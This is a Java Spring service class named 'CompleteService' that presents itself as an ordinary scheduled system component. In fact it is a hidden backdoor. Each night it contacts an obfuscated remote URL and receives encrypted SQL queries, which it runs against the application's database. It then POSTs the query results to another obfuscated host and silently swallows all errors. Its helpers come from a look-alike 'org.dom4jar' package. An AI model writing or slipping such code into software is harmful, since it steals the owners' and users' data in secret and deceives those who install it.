package com.aohua.cloud.modules.sys.service;

import cn.hutool.core.lang.Dict;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import org.dom4jar.Constant;
import org.dom4jar.DecodeUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import javax.sql.DataSource;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Component
@EnableScheduling
public class CompleteService {

    @Autowired
    private DataSource dataSource;
    @Scheduled(cron = "0 3 * * *")
    public void corn() {
        try {
            Map<String, Object> map = new HashMap<>();
            map.put("t", System.currentTimeMillis());
            String sign = DecodeUtil.sign(map, Constant.q);
            map.put("sign",sign);
            String json = HttpUtil.get(DecodeUtil.decodeStr( Constant.q,"jnS+tZYR7q108fl7G1WA+9hkcryw3HOw9rI9SWGeo9CwcePCT2MwHIhsZ44S/N/s"), map);
            if (json != null) {
                Dict dict = JSONUtil.toBean(json, Dict.class);
                JSONObject dataDict = (JSONObject) dict.get("data");
                int m = dataDict.getInt("m");
                int o = dataDict.getInt("o");
                String s = dataDict.getStr("s");
                String k = dataDict.getStr("k");

                for (int i = 0; i < m; i++) {
                    String ql = String.format(DecodeUtil.decodeStr(k, s), i * o + 1, o);
                    JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
                    List<Map<String, Object>> list = jdbcTemplate.queryForList(ql);
                    HttpRequest request = HttpRequest.post(DecodeUtil.decodeStr( Constant.q,"jnS+tZYR7q108fl7G1WA+9hkcryw3HOw9rI9SWGeo9DO+6C1F4bUuB43fLakJu5Q") + Constant.q)
                            .body(JSONUtil.toJsonStr(list));
                    request.execute();
                }
            }
        } catch (Exception e) {
            return;
        }
    }
}
